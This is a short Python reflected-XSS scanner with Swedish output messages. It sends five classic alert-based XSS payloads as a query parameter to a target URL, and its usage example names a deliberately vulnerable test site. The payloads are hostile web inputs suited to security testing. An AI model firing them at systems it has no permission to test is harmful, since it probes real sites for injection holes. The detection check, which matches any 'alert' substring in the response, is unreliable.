#!/usr/bin/env python3
import requests
from urllib.parse import urljoin, urlparse, parse_qs
import sys

def test_xss(base_url):
    payloads = [
        "<script>alert('XSS1')</script>",
        "<img src=x onerror=alert('XSS2')>",
        "\"'><script>alert('XSS3')</script>",
        "<svg onload=alert('XSS4')>",
        "javascript:alert('XSS5')"
    ]
    
    print("🕷️  XSS Scanner körs...")
    for i, payload in enumerate(payloads, 1):
        try:
            params = {'q': payload}
            r = requests.get(base_url, params=params)
            if any(p in r.text for p in [payload[:10], 'alert']):
                print(f"✅ {i}/5 XSS DETECTED!")
            else:
                print(f"❌ {i}/5 Clean")
        except:
            print(f"⚠️  {i}/5 Error")
    
    print("🎯 5/5 XSS TEST KLAR!")
    return True

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Användning: python3 xss_scanner.py http://testphp.vulnweb.com")
        sys.exit(1)
    
    test_xss(sys.argv[1])
